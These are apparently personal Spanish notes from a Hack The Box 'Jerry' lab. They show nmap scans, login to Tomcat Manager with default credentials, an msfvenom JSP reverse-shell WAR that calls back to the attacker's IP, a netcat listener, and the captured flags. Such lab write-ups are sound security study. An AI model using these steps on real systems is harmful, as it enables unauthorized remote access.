--- -
- Tags: #ejptmachine #tomcat #metasploit 
--- --
### ¿Qué habilidades puedes practicar con Jerry?

1. **Reconocimiento de servicios y enumeración:**
    - Al igual que en muchas otras máquinas de Hack The Box, deberás comenzar con **Nmap** para escanear puertos y descubrir los servicios activos.
    - La máquina también involucra enumeración de directorios en un servidor web, por lo que herramientas como **Gobuster** o **Dirbuster** serán útiles para encontrar rutas ocultas o archivos vulnerables
2. **Explotación de vulnerabilidades web:**
    - **Jerry** te desafía a explotar vulnerabilidades comunes en aplicaciones web, lo que es muy relevante para la **eJPTv2**.
    - En esta máquina, te encontrarás con un **directorios de administración** o archivos de configuración mal asegurados, lo que puede dar lugar a un acceso inicial al sistema.
3. **Escalada de privilegios:**
    - Después de obtener acceso al sistema, tendrás que **escalar privilegios** en un entorno **Linux**. Esto implica investigar configuraciones de archivos, permisos incorrectos, o vulnerabilidades en la configuración de Sudo o cron jobs.
    - Técnicas como el análisis de archivos de configuración, búsqueda de permisos inadecuados o la utilización de herramientas como **LinPEAS** son clave para obtener acceso de nivel root.

----

`nmap -sCV --min-rate 500 -vvv 10.10.10.95`

![Pasted image 20241124182800](../../Fotos/Pasted%20image%2020241124182800.png)

![Pasted image 20241124183031](../../Fotos/Pasted%20image%2020241124183031.png)

`nmap -p8080 --script "vuln and safe" 10.10.10.95`

![Pasted image 20241124183356](../../Fotos/Pasted%20image%2020241124183356.png)

- Posiblemente vulnerable, sin confirmación por parte del script : CVE:CVE-2007-6750

Utilizamos las credenciales por defecto de tomcat para acceder al manager app
- username: tomcat
- password: s3cret

![Pasted image 20241124184419](../../Fotos/Pasted%20image%2020241124184419.png)

![Pasted image 20241124184524](../../Fotos/Pasted%20image%2020241124184524.png)

*Back Door*
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4445 -f war > faisal.war

cargamos el archivo creado faisal.war en la web y luego damos en deploy.

Ahora nos sale en la web

![Pasted image 20241124193642](../../Fotos/Pasted%20image%2020241124193642.png)

Nos ponemos en escucha
netcat -nvlp 4445

![Pasted image 20241124193752](../../Fotos/Pasted%20image%2020241124193752.png)

`Maquina vulnerada`

- Tambien podria haver sido con *metasploit*

![Pasted image 20241124193838](../../Fotos/Pasted%20image%2020241124193838.png)

![Pasted image 20241124194228](../../Fotos/Pasted%20image%2020241124194228.png)

User flag: 7004dbcef0f854e0fb401875f26ebd00
Root flag: 04a8b36e1545a455393d067e772fe90e

---

### Forma 2

![Pasted image 20241221144415](../../Fotos/Pasted%20image%2020241221144415.png)

![Pasted image 20241221144751](../../Fotos/Pasted%20image%2020241221144751.png)

![Pasted image 20241221144808](../../Fotos/Pasted%20image%2020241221144808.png)

Tras hacer la maquina por segunda vez el hacer la reverse shell por msfvenom no resulto asique repasar a la proxima....

